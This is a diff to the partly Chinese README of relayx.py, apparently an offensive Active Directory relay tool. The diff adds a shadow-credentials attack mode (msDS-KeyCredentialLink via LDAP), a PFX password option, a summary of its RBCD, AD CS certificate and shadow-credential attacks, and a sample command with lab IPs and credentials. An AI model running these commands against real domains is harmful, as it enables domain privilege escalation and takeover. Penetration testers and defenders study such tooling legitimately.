@@ -17,7 +17,8 @@ optional arguments:
   --timeout TIMEOUT     timeout in seconds
   --debug               Enable debug output
   -ts                   Adds timestamp to every logging output
-  --smb-port [destination port]
+  --smb-port SMB_PORT   Port to listen on smb server
+  -rpc-smb-port [destination port]
                         Destination port to connect to SMB Server
 
 authentication:
@@ -26,12 +27,13 @@ authentication:
 
 connection:
   -dc-ip ip address     IP address of the Domain Controller
+  --ldap                Use ldap.
   -target-ip ip address
                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
 
 attack:
-  -m {rbcd,pki}, --method {rbcd,pki}
-                        Set up attack method, rbcd or pki
+  -m {rbcd,pki,sdcd}, --method {rbcd,pki,sdcd}
+                        Set up attack method, rbcd or pki or sdcd (shadow credential)
   -t {printer,efs}, --trigger {printer,efs}
                         Set up trigger method, printer or petitpotam
   --impersonate IMPERSONATE
@@ -41,6 +43,8 @@ attack:
   -pipe {efsr,lsarpc,samr,netlogon,lsass}
                         Named pipe to use (default: lsarpc)
   --template TEMPLATE   AD CS template. If you are attacking Domain Controller or other windows server machine, default value should be suitable.
+  -pp PFX_PASS, --pfx-pass PFX_PASS
+                        PFX password.
   -ssl                  This is useful when AD CS use ssl.
 
 execute:
@@ -58,6 +62,12 @@ printerbug 和 PetitPotam。 触发可通过指定参数来实现，默认使用
 ```
 
 ## 攻击场景
+目前支持三种攻击方式
+```
+-m rbcd     # 普通域成员RBCD，高权限，添加Dcsync权限
+-m pki      # 向AD CS申请证书
+-m sdcd     # 通过ldap添加 msDS-KeyCredentialLink 属性进行攻击，需要 Server >= 2016
+```
 ### 一、攻击Exchange服务器
 默认Exchange的服务权限较高，所以工具会利用Exchange的权限将当前用户增加Dcsync权限。
 ```
@@ -102,3 +112,15 @@ python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -d
 这里会向CS申请一个机器账号的证书，之后通过Rubues进行后续攻击即可。
 
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728173445.png)
+
+
+### 四、利用msDS-KeyCredentialLink
+类似于RBCD，优点是不需要添加计算机账号，缺点是需要Server版本高于2016, 可通过`-m sdcd` 来指定。
+```
+python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -dc-ip 10.211.55.200 -m sdcd
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210803105506.png)
+
+>本地没2016环境。所以会报个错。
+
+后续可通过Rubues进行后续攻击。
